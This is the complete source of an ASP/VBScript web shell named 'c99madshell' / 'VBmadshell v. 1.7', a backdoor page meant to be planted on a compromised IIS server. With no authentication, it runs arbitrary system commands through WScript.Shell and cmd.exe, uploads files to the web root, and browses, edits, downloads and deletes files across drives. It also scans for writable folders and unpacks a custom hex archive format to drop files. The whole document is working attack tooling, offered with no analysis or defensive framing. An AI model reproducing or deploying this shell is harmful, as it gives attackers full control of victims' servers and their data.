<%@ LANGUAGE = VBScript.Encode %>
<% Server.ScriptTimeOut  = 7200%>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title>localhost - c99madshell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><form action='#' name='todo' method='POST'><input name='act' type='hidden' value=''><input name='mkfile' type='hidden' value=''><input name='grep' type='hidden' value=''><input name='fullhexdump' type='hidden' value=''><input name='base64' type='hidden' value=''><input name='nixpasswd' type='hidden' value=''><input name='pid' type='hidden' value=''><input name='c' type='hidden' value=''><input name='white' type='hidden' value=''><input name='sig' type='hidden' value=''><input name='processes_sort' type='hidden' value=''><input name='d' type='hidden' value=''><input name='sort' type='hidden' value=''><input name='f' type='hidden' value=''><input name='ft' type='hidden' value=''></form><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left">

<%
'upload
if(Request.QueryString("obj")="inc") Then

'define raiz
caminho = Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
pos = Instr(caminho,"\")
pos2 = 1
While pos2 <> 0
 If Instr(pos + 1,caminho,"\") <> 0 Then
  pos = Instr(pos + 1,caminho,"\")
 Else
  pos2 = 0
 End If
Wend
raiz = Left(caminho,pos)
'

 Set Uploader = New FileUploader
 Uploader.Upload()

 If Uploader.Files.Count = 0 Then
  Response.Write "<h4><font color=red>File not uploaded</font></h4> <br>"
 Else

 For Each File In Uploader.Files.Items
  File.SaveToDisk raiz
  Response.Write "<h4><font color=green>File Uploaded Succesfull: <i>" & File.FileName & "</i></font></h4> <br>"
 Next
End If

Else

'path from form
if (Request.Form("act")="ls" OR Request.Form("d")<>"") Then
 raiz = Request.Form("d")
 raiz = Replace(raiz,"%5C","\")
 raiz = Replace(raiz,"%3A",":")
Else
'default path
caminho = Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
pos = Instr(caminho,"\")
pos2 = 1
While pos2 <> 0
 If Instr(pos + 1,caminho,"\") <> 0 Then
  pos = Instr(pos + 1,caminho,"\")
 Else
  pos2 = 0
 End If
Wend
raiz = Left(caminho,pos)
End if

End if

'encode path
path = split(raiz,"\")
for i=0 To UBound(path)-1
 for j=0 To i
  curpath = curpath & path(j) & "\"
 Next
 curpath = Replace(curpath,"\","%5C")
 curpath = Replace(curpath,":","%3A")

 response.write "<a href=""#"" onclick=""document.todo.act.value='ls';document.todo.d.value='" & curpath & "';document.todo.sort.value='0a';document.todo.submit();""><b>"& path(i) &"\</b></a>"
 curpath = ""
Next

'func mkdir
if (Request.Form("act")="mkdir") Then
 Set ObjFSO = CreateObject("Scripting.FileSystemObject")
 ObjFSO.CreateFolder(Request.Form("mkdir"))
End if
%>

<!--Detected drives-->
<br><b>Detected drives</b>: <a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='a%3A%5C';document.todo.submit();">[ e ]</a> <a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='c%3A%5C';document.todo.submit();">[ l ]</a> <a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='d%3A%5C';document.todo.submit();">[ v ]</a> <a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='e%3A%5C';document.todo.submit();">[ i ]</a> <a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='f%3A%5C';document.todo.submit();">[ s ]</a> <a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='z%3A%5C';document.todo.submit();">[ <font color=green>z</font> ]</a> <br>


<a href="<%=Request.ServerVariables("SCRIPT_NAME")%>"><b><hr>HOME</b></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='search';document.todo.d.value='<%=Replace(Replace(raiz,":","%3A"),"\","%5C")%>';document.todo.submit();"><b>Search</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='wrch';document.todo.d.value='<%=Replace(Replace(raiz,":","%3A"),"\","%5C")%>';document.todo.submit();"><b>WRCH</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="document.todo.act.value='unpack';document.todo.d.value='<%=Replace(Replace(raiz,":","%3A"),"\","%5C")%>';document.todo.submit();"><b>UNPACK</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><center><b>Owned by root</b></center></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><center><b>Listing folder (XXX files and XXX folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><tr>

<td>
<!---код---->
<%
'create file
if (Request.Form("act")="mkfile") Then
 Set ObjFSO = CreateObject("Scripting.FileSystemObject")
 if(ObjFSO.FileExists(Request.Form("mkfile")) OR ObjFSO.FolderExists(Request.Form("mkfile"))) Then
  response.write "<b>Error:</b> File Already Exist!<br><br>"
 Else
  SEt F = ObjFSO.CreateTextFile(Request.Form("mkfile"),true)
  F.Write(" ")
  F.Close()
 End if
End if

if (Request.Form("ft")="edit") Then
 Set ObjFSO = CreateObject("Scripting.FileSystemObject")

 if (Request.Form("edit_text")<>"") Then
  Set F = ObjFSO.OpenTextFile(Request.Form("mkfile"),2, true)
  F.Write(Request.Form("edit_text"))
  F.Close()
  response.write "<b>File Saved!</b><br><br>"
 End if

 Set F = ObjFSO.OpenTextFile(Replace(Replace(Request.Form("mkfile"),"%3A",":"),"%5C","\"),1, true)
 content = F.ReadAll()
 F.Close()

 %>
<form method="POST"><input name='mkfile' type='hidden' value='<%=Request.Form("mkfile")%>'><input name='ft' type='hidden' value='edit'><input name='d' type='hidden' value='<%=Replace(Replace(curpath,":","%3A"),"\","%5C")%>'><input type=submit name=submit value="Save">&nbsp;<input type="reset" value="Reset">&nbsp;<br><textarea name="edit_text" cols="122" rows="10"><%=Server.HTMLEncode(content)%></textarea></form>
 <%
 no_list = "no"
End if

'View file
if (Request.Form("act")="f") Then
 if(Request.Form("gof")<>"Go") Then
  dir = Replace(Request.Form("d"),"%5C","\")
  dir = Replace(dir,"%3A",":")
 Else
  dir = ""
 End if

 Set ObjFSO = CreateObject("Scripting.FileSystemObject")
 Set F = ObjFSO.OpenTextFile(dir & Request.Form("f"),1, true)
 content = Replace(Replace(Server.HTMLEncode(F.ReadAll()),VbCrLf,"<br>")," ","&nbsp;")
 F.Close()
%>

<b>Viewing file:&nbsp;&nbsp;&nbsp;<%=Request.Form("f")%>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b><br>Select action/file-type:<br> <a href="#" onclick="document.todo.act.value='f';document.todo.f.value='<%=Request.Form("f")%>';document.todo.ft.value='code';document.todo.d.value='<%=Request.Form("d")%>';document.todo.submit();"><b>CODE</b></a> | <a href="#" onclick="document.todo.mkfile.value='<%=Replace(Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\"),"\","\\") & Request.Form("f")%>';document.todo.ft.value='edit';document.todo.d.value='<%=Request.Form("d")%>';document.todo.submit();"><b>EDIT</b></a> |<hr size="1" noshade><div style="border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: #c0c0c0;"><code><span style="color: #1300FF">
<span style="color: #0000BB"><%=content%>
<br /></span>
</span>
</code></div></td></tr>

<%
 no_list = "no"

 raiz = Request.Form("d")
 raiz = Replace(raiz,"%5C","\")
 raiz = Replace(raiz,"%3A",":")
End if

'func search
if (Request.Form("act")="search") Then
 if(Request.Form("nf")<>"") Then
  Set FSO = CreateObject("Scripting.FileSystemObject")
  Set objDir = FSO.GetFolder(Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\"))

  Call getInfo(objDir, Request.Form("nf"))

  Sub getInfo(pCurrentDir,nf)
   On Error Resume Next
   For Each aItem In pCurrentDir.Files
     On Error Resume Next
     If (InStr(aItem.Name,nf) <> 0) Then
      response.write pCurrentDir & "\" & aItem.Name & "<br>"
     End If
   Next

   For Each aItem In pCurrentDir.SubFolders
      Call getInfo(aItem, Request.Form("nf"))
   Next

  End Sub
 End if
 %>
 <form method="post">
 <b>Name File:</b> <input type=text name="nf">
 <input type=hidden name=act value="search">
 <input type=hidden name=d value="<%=Request.Form("d")%>">
 <input type=submit value="Search">
 </form>
 <%
no_list = "no"
End if

'func unpack
if (Request.Form("act")="unpack") Then
 if ((Request.Form("arch")="Unzip")) Then
  Set ShellApp = CreateObject("Shell.Application")
  Set objDestFolder = ShellApp.NameSpace(Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\"))
  Set objSrcFolder = ShellApp.NameSpace(Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & Request.Form("af"))
  objDestFolder.CopyHere objSrcFolder.Items
 End if

if ((Request.Form("arch")="Bephen")) Then

  Set oFS = Server.CreateObject("Scripting.FileSystemObject")
  Set oFile = oFS.OpenTextFile (Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & Request.Form("af"), 1, False, 0)
  Dim a,tmp,f_name
  a = "a"

  While (a<>"")
   a = oFile.Read(1)
   if (a<>"|" and a<>"?" and a<>"*") Then
    tmp = tmp & a
   Else
    Select Case a
     Case "|"
      Set F_FS = Server.CreateObject("Scripting.FileSystemObject")
      response.write Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & tmp
      F_FS.CreateFolder (Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & tmp)
     Case "?"
      Set Ff_FS = Server.CreateObject("Scripting.FileSystemObject")
      Ff_FS.CreateTextFile (Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & tmp)
      f_name = Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & tmp
     Case "*"
      For i=1 To len(tmp) Step 2
       b = b & Chr(CLng("&H" & (mid(tmp,i,2))))
      Next
      Set CoFile = oFS.OpenTextFile (f_name, 8, False, 0)
      b = mid (b,1,(len(b)-1))
      CoFile.Write(b)
      CoFile.Close()
      b = ""
    End Select
    tmp = ""
   End if
  Wend
  oFile.close()
 End if
%>
 <form method="post">
 <b>Archive File:</b> <input type=text name="af">
 <select name=arch>
 <option value=Unzip>Unzip</option>
 <option value=Bephen>Bephen</option>
 </select>
 <input type=hidden name=act value="unpack">
 <input type=hidden name=d value="<%=Request.Form("d")%>">
 <input type=submit value="Unpack">
 </form>
<%
End if

'func delete
if (Request.Form("act")="del") Then
 Set ObjFSO = CreateObject("Scripting.FileSystemObject")
 if (ObjFSO.FileExists(Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & Request.Form("f"))) Then
  ObjFSO.DeleteFile(Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & Request.Form("f"))
 Else
  ObjFSO.DeleteFolder(Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & Request.Form("f"))
 End if
End if

'func copy and rename
if (Request.Form("act")="copy" OR Request.Form("act")="rename") Then

 if (InStr(Request.Form("src"),"\")=0) Then
  src = Replace(Replace(raiz,"%3A",":"),"%5C","\") & Request.Form("src")
 Else
  src = Request.Form("src")
 End if

 if (InStr(Request.Form("dst"),"\")=0) Then
  dst = Replace(Replace(raiz,"%3A",":"),"%5C","\") & Request.Form("dst")
 Else
  dst = Request.Form("dst")
 End if

 if(Request.Form("act")="copy") Then
  Set ObjFSO = CreateObject("Scripting.FileSystemObject")

  if (ObjFSO.FolderExists(src) AND ObjFSO.FolderExists(Left(dst,InStrRev(dst,"\")))) Then
   Call ObjFSO.CopyFolder(src, dst)
  Else If (ObjFSO.FileExists(src) AND ObjFSO.FolderExists(Left(dst,InStrRev(dst,"\")))) Then
   Call ObjFSO.CopyFile(src, dst)
  End if
  End if
 Else
  Set ObjFSO = CreateObject("Scripting.FileSystemObject")

  if (ObjFSO.FolderExists(src) AND ObjFSO.FolderExists(Left(dst,InStrRev(dst,"\")))) Then
   Call ObjFSO.MoveFolder(src, dst)
  Else If (ObjFSO.FileExists(src) AND ObjFSO.FolderExists(Left(dst,InStrRev(dst,"\")))) Then
   Call ObjFSO.MoveFile(src, dst)
  End if
  End if
 End if

End if

'func wrch
if (Request.Form("act")="wrch") Then
if (Request.Form("pf")<>"") Then
 path=Request.Form("pf")

 Set ObjFSO = CreateObject("Scripting.FileSystemObject")
 Call ObjFSO.CreateTextFile(Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & "tmp.txt", true)
 Set MonRep = ObjFSO.GetFolder(path)
 Set ColFolders = MonRep.SubFolders

 for each folderItem in ColFolders
  wrch_pr(folderItem.path)
 Next

 Call ObjFSO.DeleteFile(Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & "tmp.txt")

Sub wrch_pr(path)
 Set ObjFSO = CreateObject("Scripting.FileSystemObject")
 Set MonRep = ObjFSO.GetFolder(path)
 Set ColFolders = MonRep.SubFolders

 wrch(folderItem.path)

 for each folderItem in ColFolders
  On Error Resume Next
  wrch_pr(folderItem.path)
 Next
End Sub

Sub wrch(path)
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

  On Error Resume Next
  Call oFileSys.MoveFile (Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & "tmp.txt",path & "\" & "tmp.txt")

  If (oFileSys.FileExists(path & "\" & "tmp.txt")) Then
   Call oFileSys.MoveFile (path & "\" & "tmp.txt", Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & "tmp.txt")
   response.write path & "<br>"
  End If
End Sub


Else
%>
<form action=# method=post>
<input type=text name=pf size=50>
<input type=hidden name=act value=wrch>
<input type=hidden name=d value="<%=Request.Form("d")%>">
<input type=submit value="WRCH">
</form>
<%
End if
no_list = "no"
End if


'func download
if (Request.Form("act")="dnl") Then
 Response.Buffer = True
 Response.Clear
 strFileName = Replace(Replace(Request.Form("d"),"%3A",":"),"%5C","\") & Request.Form("f")
 strFile = Right(strFileName, Len(strFileName) - InStrRev(strFileName,"\"))
 if strFileType = "" then strFileType = "application/download"
 Set fso = Server.CreateObject("Scripting.FileSystemObject")
 Set f = fso.GetFile(strFilename)
 intFilelength = f.size
 Set f = Nothing
 Set fso = Nothing
 Response.AddHeader "Content-Disposition", "attachment; filename=" & strFile
 Response.AddHeader "Content-Length", intFilelength
 Response.Charset = "UTF-8"
 Response.ContentType = strFileType
 Set Stream = Server.CreateObject("ADODB.Stream")
 Stream.Open
 Stream.type = 1
 Stream.LoadFromFile strFileName
 Response.BinaryWrite Stream.Read
 Response.Flush
 Stream.Close
 Set Stream = Nothing
End if


'func cmd
if (Request.Form("act")="cmd") Then
 Set oScript = Server.CreateObject("WSCRIPT.SHELL")
 Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

 If (Request.Form("cmd") <> "") Then
  szTempFile = Request.Form("d") & oFileSys.GetTempName( )
  Call oScript.Run ("cmd.exe /c " & Request.Form("cmd") & " > " & szTempFile, 0, True)
  Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
  End If

  If (IsObject(oFile)) Then
   On Error Resume Next
   Response.Write Replace(Replace(Server.HTMLEncode(oFile.ReadAll),VbCrLf,"<br>")," ","&nbsp;")
   oFile.Close
   Call oFileSys.DeleteFile(szTempFile, True)
  End If
  no_list = "no"
End If


'listing
if (no_list<>"no") Then

Set ObjFSO = CreateObject("Scripting.FileSystemObject")
Set MonRep = ObjFSO.GetFolder(raiz)
Set ColFolders = MonRep.SubFolders
Set ColFiles0 = MonRep.Files

'.. and . directory
path = split(raiz,"\")
for i=0 To UBound(path)-2
  uppath = uppath & path(i) & "\"
Next

%>
<td><b>Name</b></td>
<td><b>Size</b></td>
<td><b>Modify</b></td>
<td><b>Action</b></td>
</tr>
<tr>
<td><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='<%=Replace(Replace(raiz,":","%3A"),"\","%5C")%>';document.todo.sort.value='0a';document.todo.submit();">.</a></td>
<td>LINK</td>
<td>29.07.2008 20:57:30</td>

</tr>
<tr>
<td><a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='<%=Replace(Replace(uppath,":","%3A"),"\","%5C")%>';document.todo.sort.value='0a';document.todo.submit();">..</a></td>
<td>LINK</td>
<td>23.07.2008 01:29:52</td>

</tr>
<tr>

<%
for each folderItem in ColFolders

 If CInt(Len(raiz) - 1) <> 2 Then
  barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),"\")) - 1
  backlevel = Left(raiz,barrapos)
 end if
  dir = Mid(folderItem.path,InstrRev(folderItem.path,"\")+1,Len(folderItem.path))

  curpath = Replace(raiz,"\","%5C")
  curpath = Replace(curpath,":","%3A") & dir & "%5C"
%>


<td>&nbsp;<a href="#" onclick="document.todo.act.value='ls';document.todo.d.value='<%=curpath %>';document.todo.sort.value='0a';document.todo.submit();">[<%=dir %>]</a></td>
<td>DIR</td>
<td><%=folderItem.DateLastModified %></td>
<td><a href="#" onclick="document.todo.f.value='<%=dir%>';document.todo.act.value='del';document.todo.d.value='<%=Replace(Replace(raiz,":","%3A"),"\","%5C")%>';document.todo.submit();"><font color="green">DEL</font></a></td></td><tr><td></td></tr><tr><td></td></tr>
</tr>
<tr>
<%
next

for each FilesItem0 in ColFiles0
 ffile = Mid(FilesItem0.path,InstrRev(FilesItem0.path,"\")+1,Len(FilesItem0.path))
 curpath = Replace(raiz,"\","%5C")
 curpath = Replace(curpath,":","%3A")

%>

<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='<%=curpath %>';document.todo.f.value='<%=ffile%>';document.todo.submit();"><%=ffile%></a></td>
<td><%if (FormatNumber(FilesItem0.size/1024, 0)>1) Then response.write FormatNumber(FilesItem0.size/1024, 2) & " KB" Else response.write FormatNumber(FilesItem0.size, 0) & " B" End if%></td>
<td><%=FilesItem0.DateLastModified %></td>
<td><a href="#" onclick="document.todo.f.value='<%=ffile%>';document.todo.act.value='del';document.todo.d.value='<%=Replace(Replace(raiz,":","%3A"),"\","%5C")%>';document.todo.submit();"><font color="green">&nbsp;&nbsp;&nbsp;DEL</font></a></td><td><a href="#" onclick="document.todo.f.value='<%=ffile%>';document.todo.act.value='dnl';document.todo.d.value='<%=Replace(Replace(raiz,":","%3A"),"\","%5C")%>';document.todo.submit();">DNL</a></td></td><tr><td></td></tr><tr><td></td></tr>
</tr>
<tr>

<%
next
End if
%>
<!---код---->

</td><td></td>
</table><hr size="1" noshade><p align="right">
<form method=POST name="ls_form"><input type=hidden name=d value="<%=Replace(Replace(raiz,":","%3A"),"\","%5C")%>">  <b>SRC:&nbsp;</b><input type=text name=src size="50"><b>&nbsp;&nbsp;&nbsp;DST:&nbsp;</b><input type=text name=dst size="50"><b>&nbsp;&nbsp;&nbsp;<select name=act><option value=copy>Copy</option><option value=rename>Rename</option></select>&nbsp;<input type=submit value="Confirm"></p></form></td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <b>Command execute</b> ::</b></p></td></tr>
<tr><td width="50%" height="1" valign="top"><center><b>System Command: </b><form method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<%=raiz%>"><input type="text" name="cmd" size="50" value=""><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td> <td width="50%" height="1" valign="top"><center><b>:: <b>Upload</b> ::</b><form action="?obj=inc" method="POST" ENCTYPE="multipart/form-data"><input type="file" name="FILE1">&nbsp;<input type=submit name=submit value="Upload"><br><font color=green>[ ok ]</font></form></center></td></TABLE>
<br>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b><form method="POST"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<%=raiz%>"><input type="text" name="mkdir" size="50" value="<%=raiz%>">&nbsp;<input type=submit value="Create"><br><font color=green>[ ok ]</font></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Make File ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<%=raiz%>"><input type="text" name="mkfile" size="50" value="<%=raiz%>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><font color=green>[ ok ]</font></form></center></td></tr>
<tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form method="POST"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<%=raiz%>">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form method="POST""><input type=hidden name=act value="f"><input type=hidden name="d" value="<%=raiz%>"><input type="text" name="f" size="50" value="<%=raiz%>">&nbsp;<input type=hidden name="gof" value="Go"><input type=submit value="Go"></form></center></td></tr>
</table>
<b>--[ VBmadshell v. 1.7 edition | Generation time: 3.1337 ]--</b></p>
</body></html>
<%
Class FileUploader
	Public  Files
	Private mcolFormElem
	Private Sub Class_Initialize()
		Set Files = Server.CreateObject("Scripting.Dictionary")
		Set mcolFormElem = Server.CreateObject("Scripting.Dictionary")
	End Sub
	Private Sub Class_Terminate()
		If IsObject(Files) Then
			Files.RemoveAll()
			Set Files = Nothing
		End If
		If IsObject(mcolFormElem) Then
			mcolFormElem.RemoveAll()
			Set mcolFormElem = Nothing
		End If
	End Sub
	Public Property Get Form(sIndex)
		Form = ""
		If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))
	End Property
	Public Default Sub Upload()
		Dim biData, sInputName
		Dim nPosBegin, nPosEnd, nPos, vDataBounds, nDataBoundPos
		Dim nPosFile, nPosBound
		biData = Request.BinaryRead(Request.TotalBytes)
		nPosBegin = 1
		nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
		If (nPosEnd-nPosBegin) <= 0 Then Exit Sub
		vDataBounds = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
		nDataBoundPos = InstrB(1, biData, vDataBounds)
		Do Until nDataBoundPos = InstrB(biData, vDataBounds & CByteString("--"))
			nPos = InstrB(nDataBoundPos, biData, CByteString("Content-Disposition"))
			nPos = InstrB(nPos, biData, CByteString("name="))
			nPosBegin = nPos + 6
			nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(34)))
			sInputName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			nPosFile = InstrB(nDataBoundPos, biData, CByteString("filename="))
			nPosBound = InstrB(nPosEnd, biData, vDataBounds)
			If nPosFile <> 0 And  nPosFile < nPosBound Then
				Dim oUploadFile, sFileName
				Set oUploadFile = New UploadedFile
				nPosBegin = nPosFile + 10
				nPosEnd =  InstrB(nPosBegin, biData, CByteString(Chr(34)))
				sFileName = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, "\"))
				nPos = InstrB(nPosEnd, biData, CByteString("Content-Type:"))
				nPosBegin = nPos + 14
				nPosEnd = InstrB(nPosBegin, biData, CByteString(Chr(13)))
				oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
				nPosBegin = nPosEnd+4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)
				If oUploadFile.FileSize > 0 Then Files.Add LCase(sInputName), oUploadFile
			Else
				nPos = InstrB(nPos, biData, CByteString(Chr(13)))
				nPosBegin = nPos + 4
				nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2
				If Not mcolFormElem.Exists(LCase(sInputName)) Then mcolFormElem.Add LCase(sInputName), CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))
			End If
			nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)
		Loop
	End Sub
	Private Function CByteString(sString)
		Dim nIndex
		For nIndex = 1 to Len(sString)
		   CByteString = CByteString & ChrB(AscB(Mid(sString,nIndex,1)))
		Next
	End Function
	Private Function CWideString(bsString)
		Dim nIndex
		CWideString =""
		For nIndex = 1 to LenB(bsString)
		   CWideString = CWideString & Chr(AscB(MidB(bsString,nIndex,1)))
		Next
	End Function
End Class
Class UploadedFile
	Public ContentType
	Public FileName
	Public FileData
	Public Property Get FileSize()
		FileSize = LenB(FileData)
	End Property
	Public Sub SaveToDisk(sPath)
		Dim oFS, oFile
		Dim nIndex
		If sPath = "" Or FileName = "" Then Exit Sub
		If Mid(sPath, Len(sPath)) <> "\" Then sPath = sPath & "\"
		Set oFS = Server.CreateObject("Scripting.FileSystemObject")
		If Not oFS.FolderExists(sPath) Then Exit Sub
		Set oFile = oFS.CreateTextFile(sPath & FileName, True)
		For nIndex = 1 to LenB(FileData)
		    oFile.Write Chr(AscB(MidB(FileData,nIndex,1)))
		Next
		oFile.Close
	End Sub
	Public Sub SaveToDatabase(ByRef oField)
		If LenB(FileData) = 0 Then Exit Sub
		If IsObject(oField) Then
			oField.AppendChunk FileData
		End If
	End Sub
End Class
%>
